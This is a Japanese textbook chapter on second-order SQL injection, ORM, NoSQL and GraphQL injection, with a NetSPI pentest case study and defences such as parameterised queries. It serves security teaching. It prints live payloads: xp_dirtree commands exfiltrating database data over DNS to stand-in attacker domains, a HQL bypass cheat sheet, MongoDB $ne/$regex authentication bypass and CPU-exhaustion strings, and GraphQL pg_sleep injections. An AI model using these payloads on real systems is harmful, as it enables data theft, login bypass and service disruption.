# 第6章 応用・現代トピック（second-order・ORM・GraphQL・SQLi→RCE）

## Second-order SQLi

### この節で扱うこと

これまでの章で見てきたSQLインジェクション（SQLi）は、多くの場合「入力してすぐに結果が返る」タイプの攻撃だった。攻撃者がHTTPリクエストに悪意あるペイロードを乗せると、そのままバックエンドのSQLクエリに埋め込まれ、レスポンスやエラー、時間差などに反映される。これを **first-order（一次）SQLi** と呼ぶ。

しかし実際のアプリケーションでは、ユーザー入力が「いったんデータベースに保存され、後で別の機能・別のリクエストで読み出されて、別のSQLクエリに使われる」という構成が非常に多い。プロフィール名、注文メモ、検索履歴、監査ログ、CSVインポートしたデータなどがその典型である。この「保存 → 後で再利用」という2段階の流れの中で発生するSQLiが **second-order（二次）SQLi** である。

second-order SQLiが厄介なのは、次の2点に集約される。

1. **sink（入力が最終的に実行・解釈される危険な代入先）が、入力を受け取った場所と物理的にも時間的にも離れている**ため、自動スキャナや素朴なテストでは見つけにくい。
2. **「保存時にエスケープした」という対策が、「再利用時」には意味を持たなくなる**ケースがある。これは単なる見つけにくさの問題ではなく、防御の設計そのものに穴があることが多い。

以降、この2点を軸に、PortSwigger KBの定義とNetSPIの実案件ライトアップを基に仕組みを掘り下げる。

---

### 1. 定義: sourceとsinkが分離しているSQLi

> 出典: SQL injection (second order) — https://portswigger.net/kb/issues/00100210_sql-injection-second-order

PortSwigger Web Security Academy / Burp ScannerのKB定義では、second-order SQLiは次のように説明されている。

- ユーザーが送信したデータは、送信された直後には安全に処理される（≒その場ではSQLインジェクションを起こさない）。
- しかしそのデータは**データベースに保存**され、その後アプリケーションの**別の機能**によって読み出され、**別のSQLクエリに組み込まれる際に安全でない方法で扱われる**。

これはWebアプリケーション一般で言う「source（入力の入り口）」と「sink（危険な処理が行われる出口）」の関係で整理するとわかりやすい。

- **source**: ユーザーが最初にデータを送信する箇所（例: 会員登録フォームの「氏名」欄）
- **sink**: そのデータが後でSQLクエリの構成要素として使われる箇所（例: 管理画面が会員一覧をエクスポートする際、氏名をレポート生成用の内部クエリに連結する処理）

first-order SQLiではsourceとsinkがほぼ同じリクエスト内にある。second-order SQLiではsourceとsinkの間に「DBへの永続化」というワンクッションが挟まる。この構造上の特徴から、PortSwiggerのKBは検出方法についても次のように述べている。

> 「通常、あるひとつの場所に適切なデータを送信し、その後そのデータを安全でない方法で処理する別のアプリケーション機能を使う必要がある」（意訳）

つまり、単一のリクエスト／レスポンスの往復を機械的にファジングするだけの手法（多くの自動スキャナが採る手法）では、sourceとsinkが別のHTTPリクエストにまたがるため検出漏れが起きやすい。診断者は「入力が保存される場所」と「保存されたデータが読み出されて使われる場所」をアプリケーションの機能マップとして手作業で対応付ける必要がある。これはBAC（アクセス制御）の水平/垂直権限昇格の調査手法と似た、機能横断的な探索が要求される点が特徴である。

### 2. なぜ「挿入時のエスケープ」は再利用時に破綻するのか

> 出典: SQL injection (second order) — https://portswigger.net/kb/issues/00100210_sql-injection-second-order

ここが本節の核心である。多くの開発者は「ユーザー入力をDBに保存する前にエスケープしておけば安全」という素朴な発想を持ちやすい。典型的には、シングルクォート `'` を `''`（2つ重ねる）にエスケープしてからINSERTする、という実装である。

なぜこれが破綻するのか、具体的な流れで見てみよう。

**ステップ1: 入力時のエスケープ**

ユーザーが会員登録フォームのユーザー名に次の文字列を入力したとする。

```
O'Brien
```

アプリケーションはSQLiを警戒して、保存前にシングルクォートをエスケープする。

```
O''Brien
```

このエスケープ済み文字列を `INSERT INTO users (username) VALUES ('O''Brien')` のような形でDBに書き込む。SQL構文上、連続した2つのシングルクォートは「エスケープされた1つのシングルクォート文字」を意味するため、DBエンジンはこれを正しく解釈し、**カラムに実際に格納される値は `O'Brien`（クォート1個の元の文字列）になる**。

**ステップ2: 再利用時に何が起きるか**

ここが罠である。DBに格納されている時点で、値はすでに `''` ではなく `'` に戻っている。つまり「エスケープ済みの状態」はSQL文のリテラル記法の中だけの一時的な表現であり、**格納後のデータそのものはエスケープされていない生の値**である。

したがって、後続の機能（例: 管理者がユーザー一覧をレポート出力する処理）が、このユーザー名を**文字列連結でSQL文を組み立てる**実装になっていた場合、

```sql
-- 例: レポート生成用クエリを動的に組み立てる（脆弱な実装）
sql = "SELECT * FROM logs WHERE actor = '" + username + "'"
```

ここで `username` にはすでにエスケープが解除された `O'Brien` のようなクォートを含む生の値が渡ってくる。もし攻撃者が最初の登録時に、通常の文字ではなく意図的にSQLメタ文字を含むペイロードを送っていれば（そしてそのペイロードが一次エスケープを経て文字列としては正しく格納されていれば）、二次利用時の文字列連結でクォートが「復活」し、クエリ構造そのものを破壊できる。

つまり「保存時にエスケープしたから安全」という判断は、**「保存されたデータをその後どう使うか」を見ずに下された局所最適化**であり、二段階目のsinkでパラメータ化されたクエリ（プリペアドステートメント）を使っていない限り、根本的な防御にはなっていない。

**数値データはさらに単純に破られる**

PortSwiggerのKBはもう一点、数値型（クォートで囲まれない）データについても言及している。文字列と違い数値リテラルはクォートで囲まれないため、そもそも「クォートのエスケープ」という対策自体が意味を持たない。スペース1つとSQL演算子・コメント構文（`--` や `;` など）だけで、数値コンテキストのクエリ構造は容易に破壊できる。開発者は「数値だから安全」と思い込みがちだが、これも典型的な誤解である。

### 3. 正しい防御: なぜパラメータ化が「毎回」必要か

> 出典: SQL injection (second order) — https://portswigger.net/kb/issues/00100210_sql-injection-second-order

PortSwiggerのKBが示す結論は明快で、SQLi全般に共通する原則の再確認である。

> パラメータ化クエリ（プリペアドステートメント）では、アプリケーションがクエリの「構造」を先に指定し、各ユーザー入力の「プレースホルダ」を用意する。そのうえで、各プレースホルダに入る「値」を別途指定する。

この方式が安全な理由は仕組みレベルで説明できる。プリペアドステートメントでは、SQL文の**構文解析（パース）がプレースホルダを含んだ状態で一度だけ行われ、その後に値がバインドされる**。値はSQL構文の一部として再解釈されることなく、純粋な「データ」としてのみDBエンジンに渡される。文字列連結によるクエリ構築のように「値の中の特殊文字がクエリの構文要素として再解釈される」余地が構造的に存在しない。

ここでの重要な教訓は、**このパラメータ化を「入力を受け取った最初の一箇所」だけでなく、そのデータを使うすべてのクエリ（=すべてのsink）に対して行う必要がある**という点である。KBは「一見無害に見える項目も含め、すべての可変データ項目をパラメータ化すること」と強調している。これはまさにsecond-order SQLiへの直接的な対抗策であり、「どこかで一度安全に扱った」ことは「別の場所でも安全」を保証しないという、アプリケーション全体を俯瞰した防御思想が求められる。

ストアドプロシージャや入力バリデーションも、単体では不十分な防御とされている（KBの表現では「不十分な保護」）。ストアドプロシージャ自体が内部で動的SQL文字列を組み立てていれば意味がないし、バリデーションはすり抜けを完全には防げないためである。次のNetSPIの事例は、まさにストアドプロシージャ経由のsecond-order SQLiが実際にどう悪用されるかを示す好例である。

---

### 4. 実案件ライトアップ: レポート機能に潜んだsecond-order SQLi（NetSPI）

> 出典: Second-Order SQL Injection with Stored Procedures & DNS-Based Egress — https://www.netspi.com/blog/technical-blog/web-application-pentesting/second-order-sql-injection-with-stored-procedures-dns-based-egress/

NetSPIのブログは、実際のペネトレーションテスト案件で遭遇したMicrosoft SQL Server（MSSQL）バックエンドのアプリケーションにおけるsecond-order SQLiの発見から、データ抽出（エクスフィルトレーション）までの一連の流れを記録したものである。学ぶべき点は多い。

#### 4.1 脆弱な機能構成: 「レポートID発行」と「Excelエクスポート」の2段階API

対象アプリケーションには、Excel形式でレポートを出力する機能があった。この機能は2つのAPI呼び出しに分かれていた。

1. `/api/report/` — レポートの設定（パラメータ）を送信し、レポートIDを生成・保存させるAPI
2. `/api/report/ExportToExcel` — 発行済みのレポートIDを指定し、実際にExcelファイルを生成・取得するAPI

この構成自体がすでにsecond-order SQLiの典型的な「舞台装置」になっている。1段階目のAPIで送信されたレポート設定データは、いったんサーバー側に永続化され、2段階目のAPI呼び出し（非同期のレポート生成処理）で初めて実際のクエリ構築に使われる。

脆弱だったパラメータは、JSON形式のレポート設定に含まれる日付パラメータであった。

```json
"ReportParams":"{\"76\":{\"Value\":\"2024-08-15T00:00:00.000Z\", ...}"
```

**重要なのは、入力バリデーションが1段階目のAPI受付時にしか行われていなかった点**である。2段階目のレポート生成処理（バックエンドで非同期に走る処理）では、保存済みのJSON内の値があらためて検証されることなく、そのままSQLクエリ構築に使われていた。これはまさにPortSwiggerのKBが定義する「あるアプリケーション機能では安全に処理されるが、別の機能で安全でない形で再利用される」という構造そのものである。

#### 4.2 検出プロセス: バランスの取れたペイロードと取れていないペイロードの比較

診断者は典型的なSQLi検出テクニックを、二次的なsink（非同期のレポート生成処理）に対して適用した。

- シングルクォート単体（構文を崩す＝「アンバランス」なペイロード）を注入し、後続の処理でエラーが発生するかを確認する。
- 直後に `--`（SQLコメント）を使い、崩れた構文を再度バランスさせる（＝閉じクォートの数を合わせる）ペイロードと比較する。片方でエラーが起き、もう片方でエラーが起きなければ、SQL文への注入が起きている強い証拠になる。
- `WAITFOR DELAY` によって意図的な時間差を発生させ、レスポンスが遅延するかを確認する。これによりバックエンドがMicrosoft SQL Serverであることが確定した（`WAITFOR` はMSSQL固有の構文であるため、DB種別のフィンガープリンティングにも使える）。

これらはすべて、**エラーメッセージやレスポンス本文に結果が直接表示されないブラインド/アウトオブバンドの状況**を前提にした手法である。second-order SQLiでは、sinkが非同期処理やバックエンドバッチ処理であることが多く、HTTPレスポンスに直接結果が返ってこないケースが多い。そのため時間差やアウトオブバンド通信を使った検出・抽出が事実上の標準的アプローチになる。

#### 4.3 悪用: xp_dirtreeとDNSアウトオブバンド・エクスフィルトレーション

MSSQLであることが判明した後、診断者は `xp_dirtree` という拡張ストアドプロシージャを悪用した。これはSQL Server標準で用意されている、指定したディレクトリツリー（UNCパス）を列挙するための管理用プロシージャである。

```sql
EXEC master.dbo.xp_dirtree '\\[DATA].attacker-domain\path'
```

**なぜこれがデータ漏洩に使えるのか。** `xp_dirtree` にUNCパス（`\\server\share` 形式）を渡すと、SQL ServerのOSレベルのネットワークスタックが指定されたホスト名（`server` の部分）への名前解決を試みる。ここで攻撃者が管理するドメインをホスト名部分に指定しておけば、**SQL Serverのプロセスが自発的にそのドメインへDNSクエリを発行する**。攻撃者が権威DNSサーバーとしてそのドメインを制御していれば、飛んできたDNSクエリのサブドメイン部分を読み取ることで、送信元（脆弱なSQL Server）が「知っていた」データを盗み出せる。

これは classic な **DNSエクスフィルトレーション（out-of-band data exfiltration）** の手法であり、HTTPレスポンスに結果が一切表示されないブラインドな状況でも、DNSという別チャネル経由でデータを持ち出せる点が強力である。ファイアウォールがアウトバウンドのHTTP/HTTPSを厳しく制限していても、DNS解決だけは通してしまう環境は多く、この非対称性を突く攻撃である。

**動的にデータをUNCパスへ埋め込む例（データベース名の抽出）:**

```sql
DECLARE @q NVARCHAR(256);
SELECT @q = DB_NAME();
DECLARE @cmd NVARCHAR(4000);
SET @cmd = '\\\\' + @q + '.collab.domain\\path';
EXEC master.dbo.xp_dirtree @cmd;
```

`DB_NAME()` で取得したカレントデータベース名をサブドメインとして組み込み、`xp_dirtree` にUNCパスとして渡す。SQL Serverが名前解決を試みた瞬間、攻撃者側のDNSインフラ（この案件では**Interactsh**という、アウトオブバンド通信を自動的にキャプチャするオープンソースツールが使われた）に `<データベース名>.collab.domain` というクエリが届く。手動でDNSログを監視する代わりにInteractshを使うことで、多数の抽出クエリを高速に反復・自動化できた。

同様の手法で、現在のDBユーザー名も抽出している。

```sql
SET @cmd = '\\\\' + (SELECT name FROM sys.sysusers WHERE uid = USER_ID()) + '.domain\\path'
```

データベースの列挙には `OFFSET`/`FETCH NEXT` を使い、1件ずつ確実にデータを取り出している。

```sql
(SELECT name FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)
```

#### 4.4 DNSという制約の強いチャネルを扱うための工夫

DNSのラベル（ドメイン名の各構成要素、ドットで区切られた一区画）には、RFC 1035由来の厳しい制約がある。

- 使用できる文字は英数字とハイフンのみ（記号やスペース、制御文字は使えない）。
- 1つのラベルは最大63文字まで。

抽出したいデータ（SQL Serverのバージョン文字列やテーブル名など）はこの制約に収まらないことが多いため、次の工夫が必要になる。

**不正な文字の置換:**

```sql
REPLACE(@cmd, c.value, '-')
FROM (VALUES (' '),('/'),('-'),(':'),(CHAR(13)), ...)
```

スペースやスラッシュ、コロン、制御文字といったDNSラベルで使えない文字をあらかじめハイフンなどに置換してから埋め込む。これにより、名前解決自体が失敗して攻撃者のDNSサーバーにクエリが届かない事態を防ぐ。

**長いデータのチャンク分割:**

```sql
SUBSTRING(@@VERSION, 1, 50)
```

`@@VERSION`（SQL Serverのバージョン文字列を返すグローバル変数）のように63文字を超えるデータは、`SUBSTRING` でオフセットをずらしながら複数回に分けてクエリを送信し、攻撃者側でDNSクエリの履歴を時系列に並べて元のデータを復元する。

この一連の技術は、**「1回のDNSクエリで送れる情報量には強い制約がある」という制約付きのアウトオブバンドチャネルを、データの前処理（サニタイズ）とチャンク化によって実用的な抽出パイプラインに仕立て上げる**、という考え方の実例として読める。CTFのblind SQLiで使われるテクニックが、実案件でもそのまま通用することがわかる。

#### 4.5 このケースから得られる教訓

NetSPIの事例は、PortSwiggerのKBが述べる定義を実務レベルで裏付けている。

- **sourceとsink、さらに「非同期処理」という3層構造。** 1段階目のAPIでバリデーションを済ませたつもりでも、2段階目の非同期処理でその値が再利用される時点では検証が効いていなかった。「一度検証したから安全」という思い込みが、second-order SQLiを生む典型パターンである。
- **JSON内にネストしたパラメータも例外ではない。** `ReportParams` というJSON文字列の中の、さらにネストしたキー（`"76":{"Value":...}`）が実際のsinkだった。攻撃対象領域（attack surface）の特定には、パラメータの「形」だけでなく「その値が最終的にどこで使われるか」を追う必要がある。
- **ブラインド/アウトオブバンドの検出・抽出技術は、first-orderでもsecond-orderでも共通の武器になる。** `WAITFOR` による時間差検知、UNCパス経由のDNSエクスフィルトレーションは、いずれも「レスポンスに結果が出ない」状況全般に効く汎用テクニックである。
- **`xp_dirtree` のような拡張ストアドプロシージャは、必要のない環境では無効化すべき**である。MSSQLには他にも `xp_cmdshell`（OSコマンド実行）や `xp_fileexist` など、攻撃者に悪用されやすい拡張プロシージャが多数存在する。最小権限の原則に基づき、不要な機能は無効化するかSQL Serverインスタンスの構成レベルで制限することが推奨される。

---

### 5. まとめ: second-order SQLiへの向き合い方

- **概念的には単純だが、発見には「機能マップ」の視点が要る。** sourceとsinkが別のリクエスト・別の画面・別のバッチ処理にまたがるため、単一リクエストへのファジングだけでは検出できない。診断時は「どのフィールドが保存され、後でどこに現れるか」をアプリケーション全体で追跡する必要がある。
- **「保存時にエスケープしたから安全」は誤り。** エスケープはSQL文リテラルの記法上の一時的表現であり、DBに格納された生データはエスケープされていない。再利用時に文字列連結でクエリを組み立てれば、二次的な注入が成立する。
- **唯一の確実な対策は、すべてのsinkでパラメータ化クエリを使うこと。** 「入力時に一度対策した」ことと「その後の全ての利用箇所で安全であること」はイコールではない。データが流れ着く先すべてで、値を構文の一部としてではなく純粋なデータとして扱う実装が求められる。
- **sinkがブラインド/非同期であることが多いため、時間差検知やDNSなどのアウトオブバンドチャネルを使った検出・抽出技術は必須のスキルセットになる。** NetSPIの事例のように、Interactshのようなツールを使えば手動でのDNSログ監視なしに効率よく抽出を自動化できる。
- **防御側の観点では、拡張ストアドプロシージャの無効化、最小権限のDBアカウント運用、詳細なエラーメッセージを返さないこと、といった多層防御も、SQLiが成立してしまった場合の被害範囲を抑えるうえで重要である。**

## ORM・NoSQL・GraphQLとSQLi

これまでの章では、生のSQL文字列を組み立てるアプリケーションを対象にSQLiを扱ってきた。しかし現代のアプリケーションの多くは、SQLを直接書かずにデータベースへアクセスする層――ORM（Object-Relational Mapping、オブジェクトとリレーショナルDBのテーブルを対応付けて操作を抽象化する仕組み）や、そもそもリレーショナルではないNoSQLデータベース、さらにはHTTP APIの前段に立つGraphQLレイヤーを介している。本節では、これら「抽象化レイヤーの向こう側」でSQLiやそれに類する注入がどう成立するのかを、仕組みのレベルで解説する。結論を先に言えば、抽象化レイヤーは注入を「なくす」のではなく「注入が起きる場所と形をずらす」だけであり、開発者がレイヤーの提供する安全機構（プレースホルダ、バインドパラメータ）を使わずに文字列結合をすれば、ORMでもNoSQLでもGraphQLでも同じ穴が開く。

### ORM Injection ― 安全なはずの層に潜む注入

#### 定義と基本構造

ORM Injectionとは、ORMが生成するデータアクセス層に対してSQL Injectionを行う攻撃を指す。テスターの視点からは通常のSQLiとほぼ見分けがつかないが、脆弱性そのものはORM層が生成（または実行）するコードの中に存在する点が異なる。

> 出典: ORM Injection — OWASP WSTG (05.7-ORM_Injection.md) — https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Injection/05.7-ORM_Injection.md

ORMツール（Hibernate、NHibernate、ActiveRecord、Sequelize、Eloquentなど）を使う利点は、(1) オブジェクト層を素早く生成できる、(2) データアクセスコードのテンプレートを統一できる、(3) 通常はSQL Injectionから守るための「安全な関数」（プレースホルダ・バインドパラメータ）が用意されている、という3点にある。ORMが生成するオブジェクトはCRUD（Create/Read/Update/Delete）操作のためにSQL、あるいはHQL（Hibernate Query Language）のようなSQLの方言を内部的に使う。問題は、開発者がこの「安全な関数」を使わずに、ユーザー入力をクエリ文字列へ直接連結してしまった場合に生じる。

#### 弱いORM実装：文字列連結によるHQL Injection

SANSの資料から引用された、Hibernate（Javaの代表的ORM）における脆弱なコード例は以下の通りである。

```java
List results = session.createQuery("from Orders as orders where orders.id = " + currentOrder.getId()).list();
List results = session.createSQLQuery("Select * from Books where author = " + book.getAuthor()).list();
```

これは一見「ORMを使っているから安全」に見えるが、実態は文字列連結でHQL（あるいは生SQL）を組み立てているだけであり、通常のSQLiと全く同じ穴が開いている。`currentOrder.getId()` や `book.getAuthor()` が外部入力に由来するなら、そこにSQLメタ文字を注入して`WHERE`句のロジックを書き換えられる。

正しい実装は、位置パラメータ（プレースホルダ）を使い、値の埋め込みをORMのバインド機構に委ねることである。

```java
Query hqlQuery = session.createQuery("from Orders as orders where orders.id = ?");
List results = hqlQuery.setString(0, "123-ADB-567-QTWYTFDL").list(); // 0番目のプレースホルダに文字列を安全にバインド
```

この違いが本質である。文字列連結ではDBエンジンに渡す時点で「コード（SQL構文）」と「データ（ユーザー入力）」が1本の文字列に混ざってしまい、パーサはメタ文字の区別ができない。一方プレースホルダ方式では、クエリの構文（プリペアドステートメント）が先にDBエンジンへコンパイルされ、その後で値だけが別チャネルで結合される。したがってユーザー入力に`'`や`;`が含まれていても、それは「値」としてしか解釈されず、構文としては機能しない。これは前章までに扱ったプレースホルダ/プリペアドステートメントの原理そのものであり、ORMを挟んでも原理は変わらないという点が重要である。

> 出典: ORM Injection — OWASP WSTG — https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Injection/05.7-ORM_Injection.md

#### 「実装は正しくてもORM自体が脆弱」なケース

もう一つの経路は、ORMライブラリ自体のバグである。ORM層はサードパーティのコードであり、他のソフトウェアと同様に脆弱性を持ちうる。WSTGは以下の実例を挙げている。

- **Sequelize（Node.js用ORM）**: 2019年、SequelizeのnpmライブラリにSQL Injectionの脆弱性が発見された。
- **Hibernate（Java用ORM）**: RIPS Techの調査により、Hibernateの実装にバイパス手法が存在することが示された。RIPS Techのブログ記事をもとに、WSTGはDBMSごとのバイパス用チートシートを掲載している。

| DBMS | SQL Injection（バイパス例） |
|---|---|
| MySQL | `abc\' INTO OUTFILE --` |
| PostgreSQL | `$$='$$=chr(61) \|\| chr(0x27) and 1=pg_sleep(2) \|\| version()'` |
| Oracle | `NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1'` |
| MS SQL | `1<LEN((select top 1 name from users)` |

これらのペイロードが機能する理由は、HQLやJPQL（Java Persistence Query Language）がSQLそのものではなく「SQLに変換される中間言語」だからである。ORMの構文パーサは、開発者が想定していない特殊なトークンの組み合わせ（関数呼び出し、サブクエリ、文字列演算子の入れ子など）を許容してしまうことがあり、そのトークン列が最終的にSQLへコンパイルされる際に、意図しないSQL構造として解釈される。つまりパラメータバインドを正しく使っていても、HQL自体の構文（例えば`(select ...)`のようなサブクエリをどこまで許すか）にバグがあれば、その隙間から注入が成立する。これはSQLiというより「HQLi」と呼ぶべき現象だが、最終的にRDBMSへ届く時点でSQL Injectionとして現れる。

- **Laravel Query Builder**: 2019年、Laravelの`Query-Builder`パッケージでも同種の脆弱性が公表されている。

#### 攻撃者視点でのテスト手順

WSTGが示す手順は以下の通りである。

1. **ORM層の特定**: 情報収集フェーズで使用技術（言語・フレームワーク）を特定し、その言語で一般的に使われるORMの一覧と照合する。
2. **ORM層の悪用**: 使用されているORMが分かれば、そのパーサの挙動を調べ、既知のCVEがないか確認する。ORM層の実装が甘い場合は、ORM層を意識せず通常のSQL Injectionテスト（第2〜4章で扱った手法）がそのまま通用することも多い。

> 出典: ORM Injection — OWASP WSTG — https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Injection/05.7-ORM_Injection.md

実務上の教訓は、「ORMを使っている」という事実だけではSQLi対策の証明にならず、(a) 文字列連結を使っていないか、(b) 使用しているORMのバージョンに既知の脆弱性がないか、の2点を必ず確認する必要があるということである。

---

### NoSQL Injection ― 構文が変わっても注入の本質は変わらない

#### なぜNoSQLでも「injection」が成立するのか

NoSQLデータベースはリレーショナルDBほど厳格な整合性制約を要求しないため、性能・スケーラビリティで有利とされる。しかし「SQL構文を使っていない」ことは「注入に強い」ことを意味しない。NoSQLのデータベース呼び出しは、アプリケーションのプログラミング言語そのもの、カスタムAPI呼び出し、あるいはJSON・XML・LINQなどの共通フォーマットで記述される。これらは通常のSQLiフィルタ（`< > & ;`のようなHTML特殊文字を落とす処理など）をすり抜ける。たとえばJSON APIに対する攻撃では`/ { } :`のような文字が意味を持つため、HTML用フィルタでは防げない。

> 出典: NoSQL Injection — OWASP WSTG (05.6-NoSQL_Injection.md) — https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Injection/05.6-NoSQL_Injection.md

さらにNoSQL Injectionは、宣言型のSQL言語ではなく、手続き型言語（JavaScriptなど）の中で実行される場合があり、その場合の影響はSQLiより大きくなりうる。データを盗まれるだけでなく、任意コード実行にまで発展しうるからである。NoSQL製品ごとにAPIも言語も異なるため汎用的なペイロード集は存在しないが、本節では最も普及しているMongoDBを例に説明する。

#### MongoDBにおける`$where`演算子とJavaScript注入

MongoDBのAPIは本来BSON（Binary JSON）形式の安全なクエリ組み立てツールを提供しているが、`$where`のような一部のクエリ演算子は、シリアライズされていない生のJavaScript式を許可する。

```js
db.myCollection.find( { $where: "this.credits == this.debits" } );
```

より高度な条件にはJavaScript関数そのものも渡せる。

```js
db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );
```

もしユーザー入力がサニタイズされずに`$where`へ渡ると、任意のJavaScriptを注入できる。

```js
db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );
```

`$userInput`に外部入力がそのまま埋め込まれる場合、次のような文字列を送るだけでDBエラーを誘発でき、サニタイズの有無を判定できる。

```
' " \ ; { }
```

これはSQLiにおける`'`一発でのエラー検知テストと全く同じ発想である。さらに一歩進めると、`$where`はJavaScriptという「フルスペックの言語」を評価するため、単なるデータの窃取・改ざんに留まらず任意コード実行に相当する挙動を起こせる。WSTGはCPU使用率を100%に固定するDoSペイロードを例示している。

```
0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)
```

これが`$userInput`に挿入されると、実行されるJavaScript関数は以下のようになる。

```js
function() {
  return obj.credits - obj.debits < 0;
  var date=new Date();
  do{curDate = new Date();}while(curDate-date<10000);
}
```

この式はMongoDBインスタンスを10秒間100%のCPU使用率に張り付かせる。原理は単純で、`$where`に渡された文字列はMongoDBサーバ側のJavaScriptエンジンでそのまま`eval`的に実行されるため、注入された文字列は「データ」ではなく「実行可能なコード片」として振る舞う。これはSQLiにおける「文字列リテラルの終端を書き換えて後続を制御構造として解釈させる」テクニックの、JavaScript版と言える。

> 出典: NoSQL Injection — OWASP WSTG — https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Injection/05.6-NoSQL_Injection.md

#### 予約演算子名の衝突によるインジェクション（パラメータ汚染経路）

もう一つの経路は、ユーザー入力が全くサニタイズなしでクエリに渡らない場合でも成立する。MongoDBの`$where`はクエリ演算子として予約された名前だが、PHPでは`$where`は単なる変数名としても有効である。PHP用MongoDBドライバの公式ドキュメントは明示的に警告している。

> 「すべての特殊クエリ演算子（`$`で始まるもの）については、PHPが`$exists`をその変数`$exists`の値に置き換えてしまわないよう、必ずシングルクォートで囲んでください。」

つまり、クエリが直接ユーザー入力に依存していなくても、攻撃者はHTTP Parameter Pollution（同名パラメータを複数送ることでサーバ側の変数束縛を混乱させる手法）を使い、`$where`という名前のPHP変数を外部から生成・上書きできる可能性がある。これが成功すると、クエリは以下のように置き換わる。

```
$where: function() { /* 任意のJavaScript */ }
```

この経路の教訓は、「入力値そのものはエスケープされているから安全」という思い込みが、言語・フレームワーク側の変数名解決の仕組みによって裏切られうるという点である。SQLiで言えば、値のエスケープは万全でもクエリの「構造」そのものが外部から操作可能であるケースに相当する。

> 出典: NoSQL Injection — OWASP WSTG — https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Injection/05.6-NoSQL_Injection.md

#### 構文インジェクションと演算子インジェクション（PortSwigger分類）

PortSwiggerの学習パスでは、NoSQL Injectionを大きく2種類に分類している。

- **構文インジェクション（syntax injection）**: NoSQLクエリの構文そのものを破壊して悪意あるペイロードを注入する。従来のSQLiと発想は同じだが、対象言語がNoSQLのクエリ言語になる。
- **演算子インジェクション（operator injection）**: 構文を破壊するのではなく、NoSQL側のクエリ演算子（`$ne`、`$regex`、`$where`、`$in`など）そのものを注入して意味を書き換える。

> 出典: NoSQL injection — PortSwigger Web Security Academy — https://portswigger.net/web-security/learning-paths/nosql-injection および https://portswigger.net/web-security/nosql-injection

**構文インジェクションの検出**: `'`のような特殊文字をカテゴリパラメータへ送り、内部クエリが以下のようになるかを観察する。

```
this.category == '''
```

エラーが起き、クォートをエスケープすると通る（`this.category == '\''`）場合、アプリケーションは脆弱と判断できる。真偽条件を送ってレスポンス差分を見るテストも有効である。

```
category=fizzy' && 0 && 'x
category=fizzy' && 1 && 'x
```

常に真となる条件を注入すれば、フィルタ条件を無視して全件を返させられる。

```
category=fizzy'||'1'=='1'
```

**演算子インジェクションの検出**: URLパラメータ形式の入力をJSONオブジェクトへ変換して解釈するアプリケーションでは、演算子をJSONとして注入できる。ログインフォームのパスワードフィールドへ以下を送ると、「パスワードが`"invalid"`と等しくない」という常に真に近い条件になり、認証をバイパスできることがある。

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

`$regex`演算子を使えば、正規表現マッチによるブラインド抽出（1文字ずつ真偽を判定してデータを抜き出す手法）も可能になる。

```json
{"username":"admin","password":{"$regex":"^a.*"}}
```

`$where`を悪用した文字単位のデータ抽出パターンも存在する。

```
admin' && this.password[0] == 'a' || 'a'=='b
```

これらはいずれも、SQLiにおけるブールブラインド（真偽の違いをレスポンスの差で判定する手法）や時間ベースブラインド（`pg_sleep`等で応答遅延を意図的に発生させる手法）と原理的に同一である。MongoDBでもタイミング差を使う手法が使える。

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);
while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

**防御策**: PortSwiggerは以下を推奨している。(1) 入力値をアローリスト（許可する値のリスト）方式で検証・サニタイズする、(2) 文字列連結ではなくパラメータ化されたクエリ構築を使う、(3) 受け付けるオブジェクトキー自体をアローリスト化し、`$ne`や`$regex`のような演算子キーが混入すること自体を拒否する。

> 出典: NoSQL injection — PortSwigger Web Security Academy — https://portswigger.net/web-security/nosql-injection

3番目の対策が特にNoSQL特有である点に注意したい。SQLiのプレースホルダ対策は「値」を守ればよいが、NoSQL演算子インジェクションは「キー」（`$ne`等の演算子名）そのものが攻撃面になるため、値のエスケープだけでは防げない。リクエストボディのJSONを受け取った時点で、期待する型（例えば文字列のみ）であることを検証し、オブジェクト型が混入していないかをチェックする実装が必須になる。

---

### GraphQL経由のSQL Injection ― APIレイヤーを越えて届く注入

#### GraphQLはSQLiを「防がない」

GraphQLは、クライアントが必要なフィールドだけを指定してデータを取得できるクエリ言語であり、REST APIの代替として普及している。しかしGraphQL自体はインジェクション対策の仕組みを内蔵していない。GraphQLサーバーは多くの場合、受け取ったクエリ引数をバックエンドのデータベース操作（多くはSQL）へ変換するだけであり、そこでユーザー入力がサニタイズなしに文字列結合されれば、通常のSQLiと同じ脆弱性が生まれる。

> 出典: GraphQL Injection — PayloadsAllTheThings — https://swisskyrepo.github.io/PayloadsAllTheThings/GraphQL%20Injection/

これは前章までのSQLiと本質的に同じ話だが、攻撃面（フィールドの引数）と発見経路（GraphQLの内省機能）がREST APIとは異なるため、テスト手法として独立して扱う価値がある。

#### 基本的な注入ポイント：フィールド引数

GraphQLのクエリはフィールドに引数を渡す形をとる。引数が文字列としてバックエンドのSQL文へ渡される際にプレースホルダを使わず連結されていれば、以下のように単純な`'`一発で構文を壊せる。

```graphql
{
  bacon(id: "1'") {
    id
    type
    price
  }
}
```

これがSQL構文エラーを誘発すれば、`bacon`フィールドの`id`引数がSQL文へ直接連結されている証拠になる。

時間ベースのブラインドSQLiも同様に成立する。

```graphql
query {
  user(name: "patt';SELECT 1;SELECT pg_sleep(30);--'") {
    id
    email
  }
}
```

